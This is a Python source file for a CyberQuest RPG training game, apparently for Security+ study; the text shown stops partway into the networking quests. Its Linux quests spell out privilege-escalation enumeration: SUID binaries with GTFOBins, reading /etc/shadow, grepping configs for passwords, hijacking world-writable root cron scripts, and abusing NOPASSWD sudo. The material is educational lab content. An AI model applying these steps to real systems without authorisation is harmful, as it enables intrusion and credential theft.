"""
╔══════════════════════════════════════════════════════════════════╗
║          CYBERQUEST RPG — Hacker Academy                        ║
║  Linux · Networking · Web · Crypto · Python · SIEM · More      ║
║  CompTIA Security+ Aligned  |  Parrot OS / Kali Linux Edition   ║
╚══════════════════════════════════════════════════════════════════╝

Requirements:
    pip install customtkinter

Run:
    python cyberquest_rpg.py
"""

import customtkinter as ctk
from tkinter import messagebox, scrolledtext
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from datetime import datetime

# ── CustomTkinter global appearance ────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

# ── Save file lives next to this script ────────────────────────────────────
SCRIPT_DIR = Path(__file__).parent
SAVE_FILE  = SCRIPT_DIR / "cyberquest_save.json"

# ── Hacker color palette ────────────────────────────────────────────────────
C = {
    "bg":        "#0a0f0a",   # near-black green-tinted background
    "bg2":       "#0d120d",   # card background
    "bg3":       "#111811",   # inner panel
    "border":    "#1a2e1a",   # default border
    "acc":       "#00ff41",   # matrix green accent
    "acc2":      "#00cc33",   # secondary green
    "acc3":      "#005500",   # dark green (progress bar bg)
    "warn":      "#ffcc00",   # yellow for warnings / bonus
    "danger":    "#ff3333",   # red for danger / reset
    "blue":      "#00aaff",   # blue for Python / info
    "dim":       "#3a5a3a",   # dimmed text
    "fg":        "#c0e0c0",   # body text
    "fg2":       "#7aaa7a",   # secondary text
    "white":     "#e8ffe8",   # headings
    "done_bg":   "#061206",   # completed quest bg
    "done_brd":  "#00aa22",   # completed quest border
}


# ═══════════════════════════════════════════════════════════════════════════
# SAVE SYSTEM
# ═══════════════════════════════════════════════════════════════════════════

def load_save():
    """Load progress from disk, or create a fresh save."""
    if SAVE_FILE.exists():
        try:
            with open(SAVE_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "completed_quests":  [],
        "bonus_completed":   [],
        "exam_scores":       {},
        "side_quests_done":  [],
        "seen_requirements": False,
        "started":           datetime.now().isoformat(),
    }


def write_save(data):
    """Persist player progress to disk (same directory as this script)."""
    with open(SAVE_FILE, "w") as f:
        json.dump(data, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════════
# FIRST-LAUNCH REQUIREMENTS TEXT
# ═══════════════════════════════════════════════════════════════════════════

REQUIREMENTS_TEXT = """\
╔══ CYBERQUEST RPG — GETTING STARTED ══╗

► REQUIRED OS
  Parrot Security OS (recommended) or Kali Linux
  Download: https://www.parrotsec.org/download/
  Run inside Hyper-V, VirtualBox, or VMware

► HYPER-V SETUP (Windows 10/11)
  1. Settings → Apps → Optional Features → More Windows Features → Hyper-V
  2. Create VM: 4 GB+ RAM, 40 GB+ disk, Generation 1
  3. Mount the Parrot ISO and install

► PYTHON 3  (pre-installed on Parrot)
  Verify :  python3 --version
  Install:  sudo apt install python3 python3-pip
  Venv   :  python3 -m venv ~/myenv && source ~/myenv/bin/activate

► THIS APP  (runs on Windows host)
  pip install customtkinter
  python cyberquest_rpg.py
  Progress is saved to:  cyberquest_save.json  (same folder)

► RECOMMENDED TOOLS  (pre-installed on Parrot)
  nmap, wireshark, tcpdump, burpsuite, metasploit-framework
  john, hashcat, hydra, gobuster, nikto, sqlmap, suricata
  wazuh-agent, elasticsearch, kibana, logstash

► PRACTICE TARGETS  (set up in your lab)
  Metasploitable 2  – intentionally vulnerable Linux
  DVWA              – Damn Vulnerable Web Application
  OWASP Juice Shop  – modern web vulnerabilities
  Security Onion    – open-source SIEM / detection lab

► HOW IT WORKS
  • Tier 1 quests are always unlocked
  • Complete a Tier 1 to unlock Tier 2 in the same tree
  • Bonus / Python quests are optional — they never block progress
  • Take exams to test your knowledge and earn XP
  • Check Careers to see where these skills lead
"""


# ═══════════════════════════════════════════════════════════════════════════
# SKILL TREES
# ═══════════════════════════════════════════════════════════════════════════

SKILL_TREES = {
    "linux":      {"name": "Linux Mastery",       "icon": "🐧", "color": C["acc"]},
    "networking": {"name": "Networking",           "icon": "🌐", "color": "#00ccff"},
    "crypto":     {"name": "Cryptography",         "icon": "🔐", "color": C["warn"]},
    "recon":      {"name": "Recon & OSINT",        "icon": "🔍", "color": "#ff9900"},
    "webhack":    {"name": "Web Hacking",          "icon": "🕸️", "color": "#ff2266"},
    "passwords":  {"name": "Password Attacks",     "icon": "🔑", "color": "#cc44ff"},
    "exploit":    {"name": "Exploitation",         "icon": "⚡", "color": "#ff4444"},
    "defense":    {"name": "Defensive Security",   "icon": "🛡️", "color": "#4488ff"},
    "siem":       {"name": "SIEM & Detection",     "icon": "📡", "color": "#44ddaa"},
    "governance": {"name": "Frameworks & CVEs",    "icon": "📋", "color": "#aaddaa"},
    "tools":      {"name": "Tools & AI Security",  "icon": "🦞", "color": "#ff8844"},
    "python":     {"name": "Python Scripting",     "icon": "🐍", "color": C["blue"]},
}


# ═══════════════════════════════════════════════════════════════════════════
# RANK TABLE
# ═══════════════════════════════════════════════════════════════════════════

RANKS = [
    {"level":  1, "title": "Ghost Recruit",      "xp":    0},
    {"level":  2, "title": "Script Kiddie",      "xp":  100},
    {"level":  3, "title": "Terminal Jockey",    "xp":  250},
    {"level":  4, "title": "Packet Sniffer",     "xp":  450},
    {"level":  5, "title": "Shell Popper",       "xp":  750},
    {"level":  6, "title": "Root Hunter",        "xp": 1100},
    {"level":  7, "title": "Exploit Dev",        "xp": 1600},
    {"level":  8, "title": "Zero-Day Scout",     "xp": 2200},
    {"level":  9, "title": "Shadow Operator",    "xp": 3000},
    {"level": 10, "title": "Ghost in the Wire",  "xp": 4000},
    {"level": 11, "title": "Cipher Lord",        "xp": 5200},
    {"level": 12, "title": "White Hat Legend",   "xp": 6500},
]


# ═══════════════════════════════════════════════════════════════════════════
# CAREER PROFILES
# ═══════════════════════════════════════════════════════════════════════════

CAREERS = [
    {
        "title":  "SOC Analyst (Tier 1–3)",
        "salary": "$55K – $120K",
        "desc":   "Monitor alerts in a Security Operations Center. Triage incidents, analyze logs, and escalate real threats. The entry point for most security careers.",
        "skills": "SIEM (Splunk / ELK / Wazuh), log analysis, incident triage, networking basics, ticketing",
        "certs":  "CompTIA Security+, CySA+, Splunk Core Certified User, BTL1",
        "trees":  ["defense", "siem", "networking", "governance"],
    },
    {
        "title":  "Penetration Tester",
        "salary": "$80K – $160K",
        "desc":   "Ethically hack organizations to expose vulnerabilities before real attackers do. Write detailed reports with reproduction steps and remediation advice.",
        "skills": "Nmap, Burp Suite, Metasploit, web app testing, network attacks, report writing",
        "certs":  "OSCP (gold standard), CEH, PNPT, eJPT",
        "trees":  ["recon", "webhack", "exploit", "passwords"],
    },
    {
        "title":  "Incident Responder",
        "salary": "$85K – $150K",
        "desc":   "Contain active breaches, investigate root cause, and restore systems. You are the fire department of cybersecurity.",
        "skills": "Digital forensics, malware analysis, memory forensics, log analysis, timeline reconstruction",
        "certs":  "GCIH, GCFA, CySA+, BTL2",
        "trees":  ["defense", "siem", "linux", "networking"],
    },
    {
        "title":  "Security Engineer",
        "salary": "$100K – $180K",
        "desc":   "Design and maintain security infrastructure — firewalls, IDS/IPS, SIEM, endpoint protection, and cloud security.",
        "skills": "Firewall config, IDS/IPS tuning, cloud security, Python/Bash automation, SIEM deployment",
        "certs":  "CISSP, AWS Security Specialty, CCSP, CompTIA Security+",
        "trees":  ["defense", "siem", "networking", "python", "linux"],
    },
    {
        "title":  "Threat Hunter",
        "salary": "$95K – $165K",
        "desc":   "Proactively search for threats that evade automated detection. Hypothesis-driven investigation using behavioral analysis.",
        "skills": "MITRE ATT&CK, SIEM queries, behavioral analysis, endpoint telemetry, threat intelligence",
        "certs":  "GCTI, GCIA, OSTH, CySA+",
        "trees":  ["defense", "siem", "networking", "recon"],
    },
    {
        "title":  "Red Team Operator",
        "salary": "$110K – $190K",
        "desc":   "Simulate advanced persistent threats (APTs). Full-scope adversary emulation including physical access and social engineering.",
        "skills": "Advanced exploitation, C2 frameworks, evasion techniques, physical security, social engineering",
        "certs":  "OSCP, OSEP, CRTO, GXPN",
        "trees":  ["exploit", "recon", "webhack", "passwords"],
    },
    {
        "title":  "GRC Analyst",
        "salary": "$70K – $130K",
        "desc":   "Governance, Risk, and Compliance. Ensure organizations meet security standards, pass audits, and manage risk systematically.",
        "skills": "NIST CSF, ISO 27001, risk assessment, policy writing, audit management, CVSS scoring",
        "certs":  "CISSP, CISA, CRISC, CompTIA Security+",
        "trees":  ["governance"],
    },
    {
        "title":  "AppSec Engineer",
        "salary": "$100K – $175K",
        "desc":   "Secure software from design through deployment. Code review, SAST/DAST scanning, threat modeling, and DevSecOps pipelines.",
        "skills": "Secure coding, OWASP Top 10, CI/CD security, code review, threat modeling",
        "certs":  "CSSLP, GWEB, OSWE",
        "trees":  ["webhack", "python", "governance"],
    },
]


# ═══════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def get_rank(xp):
    r = RANKS[0]
    for rank in RANKS:
        if xp >= rank["xp"]:
            r = rank
    return r


def get_next_rank(xp):
    for rank in RANKS:
        if rank["xp"] > xp:
            return rank
    return None


def total_xp(save):
    xp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in save.get("completed_quests", []))
    for bid in save.get("bonus_completed", []):
        quest = next((q for q in ALL_QUESTS if q["id"] == bid), None)
        if quest:
            xp += quest.get("bonus_xp", 0)
    xp += sum(sq["xp"] for sq in SIDE_QUESTS if sq["id"] in save.get("side_quests_done", []))
    return xp

# ═══════════════════════════════════════════════════════════════════════════
# ALL QUESTS
#
# Each quest uses the narrative RPG format:
#   OBJECTIVE       — what you're doing
#   WHY IT MATTERS  — real-world relevance (CompTIA Security+ aligned)
#   HACKER MINDSET  — how an attacker or defender thinks about this
#   QUEST           — story-driven walkthrough with embedded guidance
#   OPTIONAL PATH   — bonus challenge (never blocks progression)
#
# Tiers: 1 = always available | 2 = needs a Tier 1 done | 3 = needs Tier 2
# ═══════════════════════════════════════════════════════════════════════════

ALL_QUESTS = [

    # ══════════════════════════════════════════════════════
    # LINUX MASTERY
    # ══════════════════════════════════════════════════════

    {
        "id": "lx01", "tree": "linux", "tier": 1, "xp": 25,
        "title": "Terminal Awakening",
        "brief": "Boot your first session. Own the filesystem.",
        "bonus": "Map /etc/*.conf files — identify 5 that look interesting for a pentest.",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Underground Terminal ══╗
You've just dropped into Parrot OS for the first time.
The glowing cursor is waiting. The network is silent.
Your mission begins here — in the shell.

━━ OBJECTIVE ━━
Navigate the Linux filesystem. Understand where everything lives.

━━ WHY IT MATTERS ━━
Every cybersecurity role — SOC analyst, pentester, IR — runs on Linux.
This is the cockpit. If you can't navigate it, you can't do the job.
CompTIA Security+ expects you to know basic OS commands and file structures.

━━ HACKER MINDSET ━━
When you first land on a box — whether your own lab or a target you've
compromised — these are the first commands you run. Know the land before
you make a move.

━━ QUEST ━━
Step 1 — Situational awareness. Run these immediately:
  pwd          → Where am I?
  whoami       → Who am I logged in as?
  hostname     → What machine is this?
  id           → What groups am I in? (look for sudo / docker!)

Step 2 — Map the terrain:
  ls -la       → All files, including hidden ones (. prefix)
  ls -lah      → Same but with human-readable sizes
  cd /         → Go to root
  cd ~         → Go to your home dir
  cd -         → Jump back to last dir

Step 3 — The map every hacker memorizes:
  /            → Root of everything
  /home        → User home directories
  /root        → The superuser's home (can you read it?)
  /etc         → System config files — GOLD MINE for credentials & misconfigs
  /var/log     → All logs — incident responders live here
  /tmp         → Anyone can write here — great for dropping tools
  /bin /sbin   → Core binaries
  /opt         → Third-party / custom software
  /proc        → Running processes as a virtual filesystem

Step 4 — Explore the gold mines:
  cat /etc/hostname
  cat /etc/os-release
  ls /etc/             → What configs exist?
  ls /var/log/         → What's being logged?
  cat /etc/passwd      → User accounts (readable by everyone)

━━ NEXT LOCATION ━━
Head to the File Commander terminal (lx02). You need to move files
and search the filesystem before you can operate effectively.

━━ OPTIONAL PATH ━━
Run: find /etc -name '*.conf' 2>/dev/null | head -20
     Look at each file. Could any hold credentials or misconfigs?
     Save your findings to ~/linux_notes.txt
""",
    },

    {
        "id": "lx02", "tree": "linux", "tier": 1, "xp": 25,
        "title": "File Commander",
        "brief": "Create, copy, move, and search the filesystem like a ghost.",
        "bonus": "Build the dir structure: lab/scans lab/reports lab/wordlists — put a README in each.",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Operator's Workbench ══╗
A clean workspace is a deadly workspace.
You need to create files, move them, and find things fast.
In the field, you won't have a GUI. Just the terminal.

━━ OBJECTIVE ━━
Master file creation, manipulation, and search commands.

━━ WHY IT MATTERS ━━
Incident responders grep logs. Pentesters find credential files.
Forensic analysts search for evidence. Everyone on every team
does this. Security+ tests file-system navigation concepts.

━━ HACKER MINDSET ━━
The first question after landing on a box: "What interesting files
are here?" grep and find are your eyes. The faster you search,
the faster you find misconfigs, passwords, and keys.

━━ QUEST ━━
Step 1 — Create your ops folder:
  mkdir -p ~/lab/{scans,reports,wordlists,notes}
  touch ~/lab/notes/targets.txt
  echo "10.0.0.1 - web server" > ~/lab/notes/targets.txt
  echo "10.0.0.2 - db server" >> ~/lab/notes/targets.txt
  cat ~/lab/notes/targets.txt

Step 2 — Copy and move:
  cp ~/lab/notes/targets.txt ~/lab/notes/targets_backup.txt
  mv ~/lab/notes/targets_backup.txt /tmp/
  ls /tmp/targets_backup.txt   # Confirm it moved

Step 3 — View files safely:
  cat /etc/passwd              → Print the whole file
  head -10 /var/log/syslog     → First 10 lines
  tail -20 /var/log/auth.log   → Last 20 lines (recent logins)
  tail -f /var/log/syslog      → Live follow (Ctrl+C to stop)
  less /etc/shadow             → Scroll through (q to quit)

Step 4 — Search for files:
  find / -name "*.log" 2>/dev/null           → All log files
  find / -perm -4000 -type f 2>/dev/null     → SUID files (privesc!)
  find /home -name "*.txt" 2>/dev/null       → Text files in home dirs

Step 5 — Search INSIDE files:
  grep "Failed" /var/log/auth.log            → Failed login attempts
  grep -r "password" /etc/ 2>/dev/null       → Passwords in configs
  grep -c "Failed" /var/log/auth.log         → Count the failures
  grep -i "admin" /etc/passwd                → Case-insensitive search

━━ NEXT LOCATION ━━
Move to Permission Enforcer (lx03). Now that you can find files,
you need to understand WHO can read them — and exploit that.

━━ OPTIONAL PATH ━━
Use grep -r to search all of /home and /var for any file containing
the word "password" (case-insensitive). Document what you find.
""",
    },

    {
        "id": "lx03", "tree": "linux", "tier": 1, "xp": 30,
        "title": "Permission Enforcer",
        "brief": "Read, exploit, and set Linux permissions. SUID is your key.",
        "bonus": "Find all SUID binaries. Look up 3 on GTFOBins. Document exploitability in ~/suid_audit.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Access Control Vault ══╗
Every file on Linux has a lock. Three dials: owner, group, others.
Misconfigured locks are how hackers get root.
Your job: read the locks, and find the ones left open.

━━ OBJECTIVE ━━
Understand Linux file permissions, SUID bits, and ownership.
Find and assess world-readable or SUID files as privesc vectors.

━━ WHY IT MATTERS ━━
Permission misconfigurations are one of the top privilege escalation
vectors on any penetration test. CompTIA Security+ covers access control
concepts extensively. This is foundational OS hardening knowledge.

━━ HACKER MINDSET ━━
The moment you land on a box as a low-privilege user, you ask:
"Can I find a SUID binary that GTFOBins says gives me a shell?"
Defenders ask: "Do I have any world-writable files that an attacker
could modify to escalate?" Both questions use these same skills.

━━ QUEST ━━
Step 1 — Read the permission dials:
  ls -la /etc/passwd
  -rw-r--r-- 1 root root 1800 Jan 1 /etc/passwd
  │├─┤├─┤├─┤
  │ │   │   └── Others: r-- (read only)
  │ │   └────── Group:  r-- (read only)
  │ └────────── Owner:  rw- (read + write)
  └──────────── Type: - = file, d = dir, l = symlink

  Numbers: 4=read  2=write  1=execute  (add them)
  rwx = 4+2+1 = 7   r-x = 4+0+1 = 5   r-- = 4+0+0 = 4

Step 2 — Change permissions:
  chmod 755 myscript.sh   → rwxr-xr-x (owner full, others read+execute)
  chmod 600 secret.key    → rw------- (ONLY owner can read)
  chmod +x script.sh      → Add execute bit
  chmod o-r private.txt   → Remove others' read

Step 3 — SUID: the privilege escalation wildcard:
  find / -perm -4000 -type f 2>/dev/null
  # SUID means the file runs as the FILE'S OWNER (often root!)
  # If a SUID root binary has a known exploit → instant root

Step 4 — Check GTFOBins:
  # Visit: https://gtfobins.github.io
  # Search for any SUID binary you found (e.g., find, vim, python3)
  # If it's listed → that binary can be exploited for a shell

Step 5 — Find world-writable files (danger zone):
  find / -perm -o+w -type f 2>/dev/null | head -20
  # Anyone can write to these — can an attacker plant a backdoor?

━━ NEXT LOCATION ━━
You've mastered files and permissions. Now go deeper — Process Assassin
(lx04) — discover what's RUNNING and whether you can abuse it.

━━ OPTIONAL PATH ━━
Full SUID audit: for each binary found, record its path, check GTFOBins,
and rate it Low/Med/High risk. Save as ~/suid_audit.txt
""",
    },

    {
        "id": "lx04", "tree": "linux", "tier": 2, "xp": 40,
        "title": "Process Assassin",
        "brief": "Monitor processes, services, and cron jobs. Find the gaps.",
        "bonus": "Audit all cron jobs. Check permissions on every script they reference. Document writable ones.",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Process Control Room ══╗
Every running process is a potential vulnerability.
Every cron job is a potential backdoor.
A hacker who can write to a root cron script wins the machine.

━━ OBJECTIVE ━━
Monitor and manage Linux processes, services, and scheduled tasks.
Identify writable cron scripts as a privilege escalation vector.

━━ WHY IT MATTERS ━━
Incident response starts with: "What is running that shouldn't be?"
Pentesting asks: "Is there a cron job I can hijack for root?"
Both require the same process enumeration skills. Security+ covers
system monitoring and service management concepts.

━━ HACKER MINDSET ━━
Root cron jobs that execute scripts in /tmp or world-writable dirs
are a classic privesc path. You don't need to find a kernel exploit
if root is running your script every minute. Check cron FIRST.

━━ QUEST ━━
Step 1 — What's running right now?
  ps aux                → All processes, all users
  ps aux | grep python  → Find a specific process
  top                   → Live CPU/memory view (q to quit)
  htop                  → Prettier version (install if missing)
  pstree                → Process tree (parent/child relationships)

Step 2 — Kill a process:
  kill 1234             → Send SIGTERM (graceful shutdown)
  kill -9 1234          → SIGKILL (immediate, no cleanup)
  killall apache2        → Kill all processes named apache2

Step 3 — Background jobs:
  python3 scan.py &     → Run in background
  jobs                  → List background jobs
  fg %1                 → Bring job 1 to foreground
  nohup python3 scan.py & → Keep running after logout

Step 4 — Services with systemd:
  sudo systemctl status ssh
  sudo systemctl start ssh
  sudo systemctl stop ssh
  sudo systemctl enable ssh    → Start on boot
  sudo systemctl disable ssh   → Don't start on boot
  sudo systemctl list-units --type=service --state=running

Step 5 — CRON JOBS (the gold mine):
  crontab -l                → Your cron jobs
  sudo crontab -l           → Root's cron jobs
  cat /etc/crontab          → System-wide cron
  ls /etc/cron.d/           → Drop-in cron files
  ls /etc/cron.hourly/ /etc/cron.daily/

  For each script in root's cron, check:
  ls -la /path/to/script.sh
  # If it's world-writable → you can inject commands → root!

━━ NEXT LOCATION ━━
Processes checked. Now audit User Overlord (lx05) —
who has accounts here, who has sudo, and where are the shadow hashes?

━━ OPTIONAL PATH ━━
Write a bash one-liner that lists every cron job on the system
and checks if its script is world-writable. Save output to ~/cron_audit.txt
""",
    },

    {
        "id": "lx05", "tree": "linux", "tier": 2, "xp": 40,
        "title": "User Overlord",
        "brief": "Audit accounts, sudo rules, and shadow hashes.",
        "bonus": "Full user audit: UID 0 accounts, accounts with login shells, sudo rules, empty passwords. ~/user_audit.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Identity Archive ══╗
Every Linux box is a collection of identities.
Some accounts are legitimate. Some are backdoors.
Some have sudo rules that hand you the keys to everything.
Your job: read the archive. Find the anomalies.

━━ OBJECTIVE ━━
Enumerate user accounts, groups, sudo privileges, and password
hash storage. Identify suspicious accounts as a privesc vector.

━━ WHY IT MATTERS ━━
Unauthorized accounts and weak sudo configs are top findings in
every penetration test. CompTIA Security+ covers identity and
access management (IAM) and the principle of least privilege.

━━ HACKER MINDSET ━━
sudo -l is your first command after landing on a box as a low-priv user.
One NOPASSWD sudo rule can hand you root instantly.
Defenders look for UID 0 accounts that aren't root — that's a backdoor.

━━ QUEST ━━
Step 1 — Read the user database:
  cat /etc/passwd
  # Format: username:x:UID:GID:comment:home:shell
  # UID 0 = root level. Any UID 0 that isn't "root" is suspicious.
  # "x" in password field means hash is in /etc/shadow

Step 2 — Read the shadow file (root only):
  sudo cat /etc/shadow
  # Format: username:$type$salt$hash:...
  # Hash types: $1$=MD5(weak) $5$=SHA256 $6$=SHA512 $y$=yescrypt
  # Empty second field = no password! (log in with no creds)

Step 3 — Who's here right now?
  who               → Currently logged in
  w                 → Logged in + what they're doing
  last              → Login history
  lastb             → Failed login attempts (brute force evidence!)
  id                → Your own UID/GID/groups

Step 4 — SUDO — check this immediately:
  sudo -l
  # Look for: (ALL) NOPASSWD: /bin/bash
  # That one line means: sudo bash → root. Done.
  # Also look for: NOPASSWD for specific tools → check GTFOBins

Step 5 — Find suspicious accounts:
  awk -F: '$3 == 0 {print}' /etc/passwd   → UID 0 (should only be root)
  awk -F: '$7 !~ /nologin/ {print}' /etc/passwd → Accounts with shells
  awk -F: '$2 == "" {print}' /etc/shadow  → Empty passwords

Step 6 — Manage users (as admin):
  sudo adduser analyst
  sudo usermod -aG sudo analyst      → Grant sudo
  sudo userdel -r analyst            → Delete + remove home

━━ NEXT LOCATION ━━
You know who's here and what they can do.
Shell Scripter (lx06) teaches you to automate all of this into tools.

━━ OPTIONAL PATH ━━
Write a user audit script that outputs: UID 0 accounts, shell users,
sudo rules, and empty passwords. Save as ~/user_audit.txt
""",
    },

    {
        "id": "lx06", "tree": "linux", "tier": 3, "xp": 60,
        "title": "Shell Scripter",
        "brief": "Automate everything. Build real security tools with bash.",
        "bonus": "Write a full system audit script: SUID, world-writable, UID 0, open ports, cron jobs. Date-stamped output.",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Automation Lab ══╗
Real operators don't run commands one at a time.
They write scripts that run everything in seconds.
This is where you stop being a user and start being a developer.

━━ OBJECTIVE ━━
Write bash scripts that automate security tasks — from port checking
to privilege escalation enumeration to system auditing.

━━ WHY IT MATTERS ━━
Automation is the backbone of every security role. SOC analysts write
scripts to parse logs. Pentesters automate recon. Defenders build
playbooks as scripts. Security+ expects scripting awareness.

━━ HACKER MINDSET ━━
The moment you land on a box, you want to run a single script that
gives you everything: users, SUID files, cron jobs, open ports, kernel
version. That's what LinPEAS does. Now you'll build your own version.

━━ QUEST ━━
Step 1 — Your first script. Create ~/scripts/portcheck.sh:
  #!/bin/bash
  # Simple TCP port checker without nmap
  TARGET=${1:-127.0.0.1}
  echo "=== Port Check: $TARGET ==="
  for port in 21 22 23 25 53 80 443 445 3389 8080; do
      (echo >/dev/tcp/$TARGET/$port) 2>/dev/null \
          && echo "  [OPEN]   $port" \
          || echo "  [closed] $port"
  done

  chmod +x ~/scripts/portcheck.sh
  ./scripts/portcheck.sh 127.0.0.1

Step 2 — Variables, conditionals, and loops:
  TARGET="192.168.1.1"
  if ping -c 1 -W 1 "$TARGET" &>/dev/null; then
      echo "$TARGET is UP"
  else
      echo "$TARGET is DOWN"
  fi

  for ip in 192.168.1.{1..10}; do
      ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip UP"
  done

Step 3 — Read from files:
  while IFS= read -r line; do
      echo "Scanning: $line"
  done < ~/lab/notes/targets.txt

Step 4 — Functions:
  check_suid() {
      echo "=== SUID Files ==="
      find / -perm -4000 -type f 2>/dev/null
  }
  check_uid0() {
      echo "=== UID 0 Accounts ==="
      awk -F: '$3==0 {print $1}' /etc/passwd
  }
  check_suid
  check_uid0

Step 5 — Save timestamped output:
  REPORT=~/audit_$(date +%Y%m%d_%H%M%S).txt
  echo "=== SYSTEM AUDIT ===" > "$REPORT"
  date >> "$REPORT"
  check_suid >> "$REPORT"
  check_uid0 >> "$REPORT"
  echo "Report saved: $REPORT"

━━ NEXT LOCATION ━━
Linux tree complete. Branch into Networking — Network Foundations (net01)
is the next stop. Understanding the network is understanding the attack surface.

━━ OPTIONAL PATH ━━
Build a full system audit script combining ALL checks from this tree:
SUID, writable cron scripts, UID 0, empty passwords, open ports, kernel version.
Save timestamped output to ~/audit_reports/
""",
    },


    # ══════════════════════════════════════════════════════
    # NETWORKING
    # ══════════════════════════════════════════════════════

    {
        "id": "net01", "tree": "networking", "tier": 1, "xp": 25,
        "title": "Network Foundations",
        "brief": "OSI model, IPs, ports, TCP vs UDP. The hacker's map.",
        "bonus": "Write the full OSI model with one real attack or tool at each layer. Save to ~/network_notes.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Network Map Room ══╗
Every attack travels the network.
Every defense monitors it.
To hack or defend, you must understand how data moves.

━━ OBJECTIVE ━━
Master the OSI model, IP addressing, TCP/UDP, and key ports.
This is the map every security professional navigates daily.

━━ WHY IT MATTERS ━━
CompTIA Security+ is heavily network-focused. Networking is the
foundation of every attack: exploitation travels TCP, exfiltration
travels DNS/HTTPS, C2 uses specific ports. Know the map.

━━ HACKER MINDSET ━━
When scanning a target, you're reading the OSI stack from the bottom up.
Is the host reachable? (Layer 3) What ports are open? (Layer 4)
What services are running? (Layer 7) Each answer leads to the next move.

━━ QUEST ━━
Step 1 — The OSI Model (memorize with: "All People Seem To Need Data Processing"):
  7 Application   → HTTP, FTP, SSH, DNS, SMTP
  6 Presentation  → SSL/TLS, encryption/compression
  5 Session       → Session management, NetBIOS
  4 Transport     → TCP (reliable) / UDP (fast) — ports live here
  3 Network       → IP addresses, routing, ICMP
  2 Data Link     → MAC addresses, ARP, switches
  1 Physical      → Cables, wireless, hubs

Step 2 — IP Addressing:
  ip a                 → Your IP addresses and interfaces
  ip route             → Routing table (default gateway)
  Private ranges: 10.x.x.x | 172.16-31.x.x | 192.168.x.x
  /24 = 256 hosts | /16 = 65,536 hosts | /8 = 16M hosts

Step 3 — TCP vs UDP:
  TCP: SYN → SYN-ACK → ACK (three-way handshake, reliable)
  UDP: Fire and forget (fast, no guarantee — DNS, SNMP, DHCP)

Step 4 — Ports to memorize:
  21 FTP    22 SSH     23 Telnet   25 SMTP    53 DNS
  67/68 DHCP  80 HTTP  88 Kerberos  110 POP3  143 IMAP
  161 SNMP  389 LDAP  443 HTTPS  445 SMB   3306 MySQL
  3389 RDP  8080 Alt-HTTP  8443 Alt-HTTPS

Step 5 — Protocol deep dives relevant to attackers:
  DHCP (67/68)  → Auto IP assignment — DHCP starvation attacks exist
  ICMP          → Ping, traceroute — can leak topology, used in tunneling
  SNMP (161)    → Network device management — often has default community strings
  LDAP (389)    → Active Directory queries — LDAP injection is real
  SMB (445)     → Windows file sharing — EternalBlue (CVE-2017-0144) used this
  RDP (3389)    → Remote desktop — BlueKeep (CVE-2019-0708), brute force target

Step 6 — Basic commands:
  ping 8.8.8.8          → Test reachability (ICMP)
  traceroute 8.8.8.8    → Trace the path (UDP/ICMP)
  ss -tulnp             → Open ports + which process
  nslookup google.com   → DNS lookup
  dig google.com A      → Detailed DNS

━━ NEXT LOCATION ━━
Packet Hunter (net02) — time to see the traffic yourself.
Fire up tcpdump and watch the wire.
""",
    },

    {
        "id": "net02", "tree": "networking", "tier": 1, "xp": 30,
        "title": "Packet Hunter",
        "brief": "Capture and read network traffic. See the wire.",
        "bonus": "Capture 100 packets, open in Wireshark, identify a DNS query and a TCP handshake. Document in ~/packet_analysis.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Signal Intercept Station ══╗
The network is a river of data.
Most people swim in it blindly.
You're going to stand on the bank and watch every drop go by.

━━ OBJECTIVE ━━
Use tcpdump and Wireshark to capture and analyze network traffic.
Read protocol flags, identify handshakes, and spot cleartext data.

━━ WHY IT MATTERS ━━
Packet analysis is fundamental to: network forensics, incident response,
IDS rule writing, and protocol-level understanding. Security+ tests
your understanding of network monitoring and traffic analysis.

━━ HACKER MINDSET ━━
Before encrypted protocols dominated, packet sniffing grabbed passwords
from HTTP and FTP in plaintext. Today it's used to map network behavior,
detect anomalies, and understand exactly what a piece of malware is doing.

━━ QUEST ━━
Step 1 — tcpdump basics:
  sudo tcpdump -i eth0 -c 20                 → Capture 20 packets
  sudo tcpdump -i eth0 port 80               → HTTP only
  sudo tcpdump -i eth0 -w ~/capture.pcap     → Save to file
  sudo tcpdump -i eth0 -A port 80            → Show ASCII (read cleartext!)
  sudo tcpdump -i any icmp                   → Capture only ping traffic

Step 2 — Read the output:
  12:34:56 IP 192.168.1.100.45678 > 93.184.216.34.80: Flags [S]
  Flags: [S]=SYN  [S.]=SYN-ACK  [.]=ACK  [P.]=PSH+ACK  [F.]=FIN

Step 3 — TCP Three-Way Handshake in the wild:
  sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'
  # Watch for: SYN → SYN-ACK → ACK on any connection you make

Step 4 — Wireshark:
  wireshark &
  # Or open your saved capture: wireshark ~/capture.pcap
  Display filters (type in the filter bar):
    tcp.port == 80           → HTTP traffic
    ip.addr == 192.168.1.1   → Traffic to/from a host
    http.request             → HTTP GET/POST requests
    dns                      → All DNS queries
    tcp.flags.syn == 1       → All SYN packets

Step 5 — ARP and neighbor discovery:
  arp -a               → Current ARP table (IP → MAC mappings)
  ip neigh             → Same via iproute2
  # ARP spoofing attacks manipulate this table — man-in-the-middle!

━━ NEXT LOCATION ━━
Nmap Ninja (net03) — now you know what the wire looks like.
Time to actively scan targets and map their attack surface.
""",
    },

    {
        "id": "net03", "tree": "networking", "tier": 2, "xp": 45,
        "title": "Nmap Ninja",
        "brief": "The recon weapon of choice. Map every target.",
        "bonus": "Full scan of localhost with -sV -sC -O -oA ~/scans/localhost — analyze all three output files.",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Recon Outpost ══╗
Nmap is your first weapon on any engagement.
Before you attack, you map.
